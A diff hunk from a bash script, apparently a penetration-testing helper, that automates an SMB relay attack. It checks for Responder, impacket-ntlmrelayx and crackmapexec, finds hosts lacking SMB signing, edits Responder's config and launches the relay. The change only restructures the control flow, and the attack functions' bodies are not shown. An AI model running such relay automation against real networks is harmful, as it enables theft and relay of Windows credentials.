@@ -193,27 +193,26 @@ if tmux has-session -t "$session_name" 2>/dev/null; then
             ;;
     esac
 fi
+
+# Check required arguments
+if [ -z "${TARGET_FILE}" ]; then
+    echo -e "${RED}[!] Usage: ./$0 [-f TARGET_FILE] [-i NETWORK_INTERFACE]${NC}"
+    exit 1
+fi
+
+validate_network_interface
+# Check if required tools are installed
+check_tool "tmux"
+check_tool "responder"
+check_tool "impacket-ntlmrelayx"
+check_tool "crackmapexec"
+
+run_crackmapexec
+
+if [ -s "${TARGET_SMB_FILE}" ]; then
+    edit_responder_conf
+    sleep 2
+    run_smb_relay_attack
 else
-    # Check required arguments
-    if [ -z "${TARGET_FILE}" ]; then
-        echo -e "${RED}[!] Usage: ./$0 [-f TARGET_FILE] [-i NETWORK_INTERFACE]${NC}"
-        exit 1
-    fi
-    
-    validate_network_interface
-    # Check if required tools are installed
-    check_tool "tmux"
-    check_tool "responder"
-    check_tool "impacket-ntlmrelayx"
-    check_tool "crackmapexec"
-    
-    run_crackmapexec
-    
-    if [ -s "${TARGET_SMB_FILE}" ]; then
-        edit_responder_conf
-        sleep 2
-        run_smb_relay_attack
-    else
-        echo -e "${RED}[!] There are no misconfigured smb signing targets found. Exiting...${NC}"
-    fi
+    echo -e "${RED}[!] There are no misconfigured smb signing targets found. Exiting...${NC}"
 fi
